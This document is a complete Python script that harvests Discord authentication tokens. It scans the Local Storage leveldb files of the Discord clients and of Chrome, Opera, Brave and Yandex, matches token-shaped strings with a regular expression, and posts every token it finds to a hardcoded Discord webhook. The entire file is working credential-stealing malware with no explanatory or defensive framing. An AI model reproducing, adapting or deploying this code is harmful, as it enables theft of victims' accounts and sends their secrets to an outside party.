import os
import re
import requests

WEBHOOK_URL = 'https://discord.com/api/webhooks/1351059057628418059/3bzDwCHCiu-w77rw4xpRrfHCMX_N40-WAIKP14UpbBeJNnutw9uwRgLs1gs1bCAuKJRv'

def find_tokens(path):
path += '\\Local Storage\\leveldb'
tokens = []
for file_name in os.listdir(path):
if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
continue
for line in [x.strip() for x in open(f"{path}\\{file_name}", errors='ignore').readlines() if x.strip()]:
for token in re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', line):
tokens.append(token)
return tokens

def main():
local = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')
paths = {
'Discord': roaming + '\\Discord',
'Discord Canary': roaming + '\\discordcanary',
'Discord PTB': roaming + '\\discordptb',
'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
'Opera': roaming + '\\Opera Software\\Opera Stable',
'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
}

message = ''
for platform, path in paths.items():
if not os.path.exists(path):
continue
tokens = find_tokens(path)
if len(tokens) > 0:
message += f'**{platform}**\n' + '\n'.join(tokens) + '\n\n'

if message:
payload = {
'content': message
}
requests.post(WEBHOOK_URL, json=payload)

if __name__ == '__main__':
main()